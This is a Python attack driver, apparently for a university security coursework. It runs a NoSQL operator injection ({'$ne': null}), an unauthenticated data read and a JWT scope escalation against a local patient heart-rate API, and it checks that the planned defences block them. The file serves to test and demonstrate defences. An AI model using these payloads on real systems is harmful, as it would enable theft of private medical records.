"""
attack/attack2_nosql.py
Attack 2 — NoSQL Injection & Unauthorised Exfiltration
Owner: YYX

Overview:
  - Driver for Attack 2, chaining three sub-attacks that together demonstrate unauthorised exfiltration of patient data from the cloud API.
  - Seeds the target database with real heart-rate records from cleaned dataset (data/processed/heart_rate_cleaned.csv).
  - Each sub-attack targets a different defence layer: JWT authentication(A2.1), Pydantic schema validation(A2.2), 
    and JWT scope enforcement(A2.3). 
  - A2.2 models a realistic post-compromise scenario in which the attacker has already stolen a legitimate clinician JWT 
    and attempts NoSQL operator injection on the single-patient lookup endpoint.
"""

import json
import os
import sys
import requests
import pandas as pd

BASE     = "http://localhost:5000"
CSV_PATH = os.path.join("data", "processed", "heart_rate_cleaned.csv")

# ANSI colours
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner(title: str) -> None:
    print(f"{BOLD}{CYAN}  {title}{RESET}")

def result(label: str, status: int, body: str) -> None:
    colour = GREEN if status == 200 else RED
    print(f"  Status : {colour}{BOLD}{status}{RESET}")
    preview = body[:100].replace("\n", " ")
    print(f"  Body   : {preview}")
    print(f"  Result : {colour}{label}{RESET}\n")


# Setup: seed the database from LKK's cleaned CSV 
def setup_seed_data(rows_per_patient: int = 3) -> None:
    banner("SETUP — Seeding database from heart_rate_cleaned.csv")

    try:
        enroll_r = requests.post(
            f"{BASE}/enroll",
            json={"device_id": "seed-device"},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        sys.exit(1)

    token   = enroll_r.json().get("token", "")
    headers = {"Authorization": f"Bearer {token}"}

    df = pd.read_csv(CSV_PATH)
    df = df.groupby("patient_id").head(rows_per_patient).reset_index(drop=True)
    records  = df[["patient_id", "timestamp", "heart_rate"]].to_dict(orient="records")
    n_pat    = df["patient_id"].nunique()
    print(f"  Source   : {CSV_PATH}")
    print(f"  Patients : {sorted(df['patient_id'].unique().tolist())}")
    print(f"  Rows     : {len(records)} ({rows_per_patient} per patient × {n_pat} patients)\n")

    ok = 0
    for rec in records:
        payload = {
            "patient_id": str(rec["patient_id"]),
            "timestamp":  int(rec["timestamp"]),
            "heart_rate": float(rec["heart_rate"]),
        }
        r = requests.post(f"{BASE}/ingest", json=payload, headers=headers, timeout=5)
        colour = GREEN if r.status_code == 200 else RED
        print(f"  {payload['patient_id']}  ts={payload['timestamp']}  "
              f"hr={payload['heart_rate']:.2f}  → {colour}{r.status_code}{RESET}")
        if r.status_code == 200:
            ok += 1

    print(f"\n  {GREEN}Seeded {ok}/{len(records)} records successfully.{RESET}")


# A2.1 — Unauthenticated probe
def attack_2_1_unauthenticated_probe():
    banner("A2.1 — Unauthenticated Probe")
    print(f"  Target : GET {BASE}/readings")
    print(f"  Intent : Access patient records with zero credentials")

    try:
        r = requests.get(f"{BASE}/readings", timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    if r.status_code == 200:
        records = r.json().get("records", [])
        patients = sorted(set(
            rec.get("patient_id") for rec in records
            if isinstance(rec.get("patient_id"), str)
        ))
        print(f"  {RED}{BOLD}LEAKED {len(records)} patient records "
              f"across {len(patients)} patients!{RESET}")
        print(f"  Patients exposed: {patients}")
        label = "VULNERABLE — unauthenticated read succeeded"
    else:
        label = "DEFENDED  — server rejected unauthenticated request"

    result(label, r.status_code, r.text)
    return r.status_code


# A2.2 — NoSQL Operator Injection via search_patient
def attack_2_2_nosql_operator_injection():
    banner("A2.2 — NoSQL Operator Injection")
    print(f"  Target  : POST {BASE}/search_patient")
    print(f"  Payload : patient_id set to {{\"$ne\": null}} MongoDB operator")

    # Simulate the attacker already having a readings:read token.
    # /enroll would only give ingest:write, so the demo backdoor
    # /_debug_clinician_token stands in for the stolen credential.
    try:
        token_r = requests.post(
            f"{BASE}/_debug_clinician_token",
            json={"subject": "stolen-clinician-jwt"},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    if token_r.status_code != 200:
        print(f"  {RED}Could not obtain stolen clinician token: "
              f"{token_r.status_code} {token_r.text}{RESET}")
        return token_r.status_code

    token   = token_r.json().get("token", "")
    headers = {"Authorization": f"Bearer {token}"}

    malicious_payload = {
        "patient_id": {"$ne": None},
    }


    try:
        r = requests.post(
            f"{BASE}/search_patient",
            json=malicious_payload,
            headers=headers,
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    if r.status_code == 200:
        records = r.json().get("records", [])
        patients = sorted(set(
            rec.get("patient_id") for rec in records
            if isinstance(rec.get("patient_id"), str)
        ))
        print(f"  {RED}{BOLD}NoSQL injection succeeded — dumped {len(records)} "
              f"records across {len(patients)} patients!{RESET}")
        print(f"  Patients exposed: {patients}")
        label = "VULNERABLE — Mongo executed $ne operator, full collection dumped"
    elif r.status_code == 400:
        label = "DEFENDED  — Pydantic schema rejected NoSQL operator payload"
    else:
        label = f"BLOCKED   — server rejected with status {r.status_code}"

    result(label, r.status_code, r.text)
    return r.status_code


# A2.3 — Scope Escalation
def attack_2_3_scope_escalation():
    banner("A2.3 — Scope Escalation (ingest token → readings endpoint)")
    print(f"  Target : GET {BASE}/readings")
    print(f"  Method : Reusing ingest token for unauthorized read access")

    try:
        enroll_r = requests.post(
            f"{BASE}/enroll",
            json={"device_id": "dev-attack-A2"},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"  {RED}ERROR: Cannot connect to {BASE}. Is cloud.py running?{RESET}")
        return None

    if enroll_r.status_code != 200:
        print(f"  {RED}Could not enroll device: {enroll_r.status_code} {enroll_r.text}{RESET}")
        return enroll_r.status_code

    token = enroll_r.json().get("token", "")

    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE}/readings", headers=headers, timeout=5)

    if r.status_code == 200:
        records = r.json().get("records", [])
        patients = sorted(set(
            rec.get("patient_id") for rec in records
            if isinstance(rec.get("patient_id"), str)
        ))
        print(f"  {RED}{BOLD}Privilege escalation succeeded — "
              f"read {len(records)} records across {len(patients)} patients "
              f"with ingest-only token!{RESET}")
        print(f"  Patients exposed: {patients}")
        label = "VULNERABLE — ingest-scoped token accepted on read endpoint"
    else:
        label = "DEFENDED  — server rejected wrong-scope token"

    result(label, r.status_code, r.text)
    return r.status_code


# Validation mode: confirm all three defences are live 
def validate_defences(results: dict) -> None:
    banner("VALIDATION SUMMARY")
    expected = {
        "A2.1": 401,   # JWT: no token
        "A2.2": 400,   # Pydantic: dict-valued patient_id
        "A2.3": 401,   # JWT: insufficient scope
    }

    all_pass = True
    for key, exp in expected.items():
        got = results.get(key)
        if got is None:
            print(f"  {YELLOW}{key}: skipped (connection error){RESET}")
            all_pass = False
        elif got == exp:
            print(f"  {GREEN}PASS{RESET}  {key}: got {got} (expected {exp})")
        else:
            print(f"  {RED}FAIL{RESET}  {key}: got {got} (expected {exp})")
            all_pass = False

    print()
    if all_pass:
        print(f"  {GREEN}{BOLD}All defences verified. Safe to screenshot for CW2 Page 3.{RESET}")
    else:
        print(f"  {YELLOW}Some checks failed. If running against undefended build, this is expected.{RESET}")
        print(f"  {YELLOW}Rerun after ZYM's cloud_auth.py + cloud_schema.py are integrated.{RESET}")


# Entry point
if __name__ == "__main__":
    print(f"\n{BOLD}ELEC0138 Group 21 — Attack 2: NoSQL Injection & Unauthorised Exfiltration{RESET}")
    print(f"Target base URL: {CYAN}{BASE}{RESET}")
    print(f"Run with --validate flag after ZYM's defences are live.\n")

    validate_mode = "--validate" in sys.argv
    skip_seed     = "--no-seed"  in sys.argv

    if not skip_seed:
        setup_seed_data(rows_per_patient=3)

    results = {}
    results["A2.1"] = attack_2_1_unauthenticated_probe()
    results["A2.2"] = attack_2_2_nosql_operator_injection()
    results["A2.3"] = attack_2_3_scope_escalation()

    if validate_mode:
        validate_defences(results)
    else:
        banner("RAW RESULTS (undefended run)")
        for k, v in results.items():
            colour = GREEN if v == 200 else (YELLOW if v is None else RED)
            print(f"  {k}: {colour}{v}{RESET}")